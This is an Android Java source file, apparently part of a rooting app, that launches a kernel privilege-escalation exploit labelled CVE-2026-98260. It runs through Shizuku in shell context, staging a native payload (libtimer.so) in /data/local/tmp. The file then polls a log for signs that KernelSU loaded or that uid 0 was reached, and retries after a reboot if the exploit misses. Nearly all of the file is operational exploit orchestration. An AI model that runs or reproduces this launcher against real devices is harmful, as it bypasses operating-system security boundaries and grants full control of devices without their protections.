package com.puddingroot;

import android.content.Context;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Method;

import rikka.shizuku.Shizuku;

/**
 * Runs the CVE-2026-98260 exploit in shell (uid 2000) context through Shizuku,
 * then watches /data/local/tmp/timer.log until it succeeds or gives up.
 */
public class RootRunner implements Runnable {

    public interface Sink {
        void onLine(String line);

        void onDone(boolean ok, String summary);
    }

    private static final String TIMER_LOG = "/data/local/tmp/timer.log";
    private static final long TIMEOUT_MS = 200_000L;

    private final Context ctx;
    private final String ksuPkg;
    private final Sink sink;

    public RootRunner(Context ctx, String ksuPkg, Sink sink) {
        this.ctx = ctx;
        this.ksuPkg = ksuPkg;
        this.sink = sink;
    }

    /** Shizuku.newProcess is a hidden static API; invoke it reflectively. */
    private static Process newProcess(String[] cmd) throws Exception {
        Method m = Shizuku.class.getDeclaredMethod(
                "newProcess", String[].class, String[].class, String.class);
        m.setAccessible(true);
        return (Process) m.invoke(null, cmd, new String[]{}, "/data/local/tmp");
    }

    private static String sh(String command) {
        try {
            Process p = newProcess(new String[]{"/system/bin/sh", "-c", command});
            StringBuilder sb = new StringBuilder();
            try (BufferedReader r = new BufferedReader(
                    new InputStreamReader(p.getInputStream(), "UTF-8"))) {
                String line;
                while ((line = r.readLine()) != null) {
                    sb.append(line).append('\n');
                }
            }
            p.waitFor();
            return sb.toString();
        } catch (Throwable t) {
            return "ERR " + t;
        }
    }

    public static String runShizukuCommand(String command) {
        return sh(command);
    }

    @Override
    public void run() {
        try {
            String lib = ctx.getApplicationInfo().nativeLibraryDir + "/libtimer.so";
            String tmp = "/data/local/tmp/a/ptimer";
            String launch = "export PATH=/system/bin:/system/xbin:/sbin; "
                    + "mkdir -p /data/local/tmp/a; "
                    + "cp '" + lib + "' " + tmp + " && chmod 755 " + tmp
                    + " && cd /data/local/tmp"
                    + " && KSU_PKG='" + ksuPkg + "' " + tmp + " fake -d";

            sink.onLine("staging payload…");
            sh(launch);
            sink.onLine("exploit launched. watching timer.log (this is probabilistic; "
                    + "if it misses, reboot and retry)…");

            long deadline = System.currentTimeMillis() + TIMEOUT_MS;
            int lastLen = 0;
            while (System.currentTimeMillis() < deadline) {
                Thread.sleep(1500);
                String log = sh("cat " + TIMER_LOG + " 2>/dev/null");
                if (log == null) {
                    log = "";
                }
                if (log.length() > lastLen) {
                    String chunk = log.substring(lastLen);
                    lastLen = log.length();
                    for (String line : chunk.split("\n")) {
                        if (!line.isEmpty()) {
                            sink.onLine(line);
                        }
                    }
                }
                if (log.contains("KSU_LOADED")) {
                    sink.onDone(true, "SUCCESS: KernelSU loaded. Verify with: adb shell su -c id");
                    return;
                }
                if (log.contains("ROOT_SHELL_OK")) {
                    sink.onDone(true, "SUCCESS: uid=0 reached.");
                    return;
                }
                if (log.contains("parking") || log.contains("no successful plant")) {
                    sink.onDone(false,
                            "FAILED (reclaim missed). Reboot the device, then tap Root again.");
                    return;
                }
            }
            sink.onDone(false, "Timed out. Reboot and retry.");
        } catch (Throwable t) {
            sink.onDone(false, "ERROR: " + t);
        }
    }
}
